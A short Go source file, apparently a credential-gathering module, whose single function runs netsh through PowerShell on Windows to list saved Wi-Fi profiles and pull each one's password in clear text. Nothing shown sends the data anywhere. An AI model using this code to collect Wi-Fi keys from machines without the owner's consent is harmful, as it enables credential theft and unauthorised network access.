package gather

import (
	"fmt"
	"strings"

	ps "github.com/bhendo/go-powershell"
)

// GetWifiPasswords uses poweshell to get wifi passwords on a windows machine
func GetWifiPasswords(shell ps.Shell) (map[string]string, error) {
	stdout, _, err := shell.Execute("netsh wlan show profiles")
	lines := strings.Split(stdout, "\n")
	wifi := map[string]string{}

	for i := 0; i < len(lines); i++ {
		v := lines[i]
		if strings.Contains(v, "All User Profile") {
			profileName := strings.TrimSpace(strings.Split(v, ":")[1])
			stdout, _, err := shell.Execute(fmt.Sprintf("netsh wlan show profile key=clear name=%s", profileName))
			if err != nil {
				fmt.Println(err)
				continue
			}

			passLines := strings.Split(stdout, "\n")
			password := ""
			for j := 0; j < len(passLines); j++ {
				w := passLines[j]
				if strings.Contains(w, "Key Content") {
					password = strings.TrimSpace(strings.Split(w, ":")[1])
				}
			}
			wifi[profileName] = password
		}
	}

	return wifi, err
}
